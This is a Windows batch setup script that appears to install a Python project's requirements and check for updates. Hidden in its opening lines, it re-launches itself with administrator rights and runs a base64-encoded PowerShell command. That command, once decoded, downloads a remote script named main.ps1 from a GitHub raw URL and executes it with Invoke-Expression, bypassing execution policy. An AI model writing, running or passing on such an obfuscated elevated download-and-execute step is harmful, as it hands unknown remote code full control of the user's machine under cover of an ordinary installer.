@echo off
if not "%1"=="am_admin" (powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'" & exit /b)
powershell -exec Bypass -e JAB1AHIAbAAgAD0AIAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ASwBEAG8AdAAyADIANwAvAFAAeQB0AGgAbwBuAFAAYQB0AGgARgBpAHgAZQByAC8AbQBhAGkAbgAvAG0AYQBpAG4ALgBwAHMAMQAnADsAJABzAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0ACAAPQAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHUAcgBsADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABzAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0AA==

color 5

title Checking Python Version
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
    echo Make sure it is added to PATH.
    pause > nul
)

title Installing Requirements
cd /d "%~dp0"
echo Installing Requirements...
python -m pip install -r requirements.txt

cd tools
title Checking for updates
echo Checking for updates...
python update.py
